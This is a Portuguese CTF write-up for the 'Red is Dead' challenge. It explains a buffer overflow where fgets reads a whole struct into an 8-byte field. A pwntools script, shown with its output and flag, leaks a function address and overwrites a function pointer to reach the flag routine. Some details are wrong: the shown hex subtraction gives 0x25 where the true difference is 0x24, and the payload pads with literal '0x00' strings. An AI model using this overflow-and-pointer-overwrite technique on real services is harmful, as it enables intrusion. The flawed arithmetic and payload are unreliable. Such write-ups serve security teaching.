---
title:  "Red is Dead - Can CWIC CTF 2017"
date:   2017-10-14 10:47:06
categories: [write-ups]
tags: [Can CWIC CTF 2017]
---
Analisando a estrutura `user` nós se depara com uma variável color [8 bytes], uma variável name [8 bytes] e um ponteiro [8 bytes]
sendo uma estrutura de 24 bytes em sistemas 64 bits

``` c
struct user {
    char color[8];
    char name[8];
    void (*next)(struct user*);
};
```

linha 17 a  20 não importa para nós, vamos pular e ir para as funções `success_knight` e `sucess_king`.
``` c
void success_knight(struct user *user) {
    printf("Keeper: Right. Off you go.\n");
    user->next = NULL;
}

void success_king(struct user *user) {
    printf("Keeper: What? I don't know that! Auuuuuuuugh!\n");
    printf("FLAG\n");
    user->next = NULL;
}
```
temos duas funções, uma sucess_knight e uma success_king, essa foi fácil, a função success king é a função final ontem entrega a
flag, e a função success_knight é apenas um caminho que não vai da em nada, então descartamos ela!

vamos para proxima função `check_knight`.
``` c
void check_knight(struct user *user) {
    user->next = success_knight;
    printf("Keeper: What is your favorite color?\n");
    char *res = fgets(user->color, sizeof(struct user), stdin);
    if (res == NULL) {
        user->next = NULL;
        return;
    }
    chomp(user->color);
    if (strcmp(user->color,"red")) {
        user->next = dead;
    }
}
```
Observando a linha 36 me deparei com um overflow
``` c
char *res = fgets(user->color, sizeof(struct user), stdin);
```
Aqui ele tá usando o sizeof para pegar a quantidade de bytes da estrutura user e definir
na variável color, ou seja, o que era 8 bytes agr virou 24 bytes!, o que isso nos ajudará?
poderemos fazer um buffer overflow que nos retornará alguns vazamentos de endereços

``` c
void check_king(struct user *user) {
    user->next = success_king;
    printf("Keeper: What is the air-speed velocity of an unladen swallow?\n");
    printf("%s: What do you mean?\n", user->name);
    char *res = fgets(user->color, sizeof(struct user), stdin);
    if (res == NULL) {
        user->next = NULL;
        return;
    }
    chomp(user->color);
    user->next = success_king;
    if (strcmp(user->color,"An African or European swallow?")) {
        user->next = dead;
    }
}
```

``` c
void start(struct user *user) {
    printf("Keeper: Stop! What is your name?\n");
    char *res = fgets(user->name, sizeof(struct user), stdin);
    if (res == NULL) {
        user->next = NULL;
        return;
    }
    chomp(user->name);

    size_t len = strlen(user->name);
    if (len < 2) { printf("Keeper: Sorry `%s', your name is too short\n", user->name);
        user->next = NULL;
        return;
    }

    if(!strncmp(user->name, "Arthur", 6)) {
        user->next = check_king;
        printf("Arthur: It is Arthur, King of the Britons.\n");
    } else {
        user->next = check_knight;
        printf("%s: Sir %s of Camelot.\n", user->name, user->name);
    }
}
```

Bem, Nós poderia começar com o nome `Arthur` e nós iria para ``check_king`` nós realizaríamos a substituição do usuário-> seguinte, mas então não havia como para superar o seguinte check!

então nós iria para `user->next = success_king;` que nos daria a flag, foi o que eu pensei, porém, not so easy!

``` c
chomp(user->color);
    user->next = success_king;
    if (strcmp(user->color,"An African or European swallow?")) {
        user->next = dead;
```

Para nós ir para o success king isso era impossível, pois o comprimento da string era [31 bytes] era maior do que o número de bytes para a cor (24), portanto, o strcmp sempre retornaria verdadeiro (as strings não coincidem) e o usuário-> próximo seria configurado para morto.

Portanto o check correto é o `check_knight`
``` c
if (strcmp(user->color,"red")) {
    user->next = dead;
}
```

Temos que burlar a cor para red, isso é fácil já que o fgets ler bytes nulos nós fazeria com`‘red\0’`, cor burlada
agora vamos ajeitar o caminho do `success_king`

Dando um objdump -t <nome do arquivo> teremos o andress das minhas duas funções `success_king` e `success_knight`

`000000000040084e g     F .text  000000000000002e              success_king`
`000000000040082a g     F .text  0000000000000024              success_knight`

Agora para calcular o deslocamento basta diminuir o andress de uma função pela outra

``` python
>>> hex (0x000000000040084e - 0x000000000040082a)
'0x25'
>>> 0x25
37
```

Temos nossa distancia de uma função para outra, `37`, então, teremos que subtrair do andress do `check_king`
tendo tudo que precisamos, é hora do solve

```
from pwn import *
import struct
import time

def p(x):
    return struct.pack("<q", x)

addr = 0
offset = -37

r = remote('159.203.38.169', 5683)
r.recv(1024)

print("[*] Triggering leak...")
r.send('knightAA' + '\n')
time.sleep(0.3)

print("[*] Retrieving address of check_knight...")
resp = r.recv(1024).strip()
addr = resp[8:14] + '\x00\x00'
addr = struct.unpack("<q", addr)[0]

print("[*] Calculating address of success_king...")
addr += offset

print("[*] Calling success_king...")
r.send('red\0' + '0x00' + '0x000000' + p(addr))
time.sleep(0.3)

resp = r.recv(1024)
print(resp[resp.find('FLAG'):])
r.close()
```

```
[+] Opening connection to 159.203.38.169 on port 5683: Done
[*] Triggering leak...
[*] Retrieving address of check_knight...
[*] Calculating address of success_king...
[*] Calling success_king...
`FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}`

[*] Closed connection to 159.203.38.169 port 5683
```
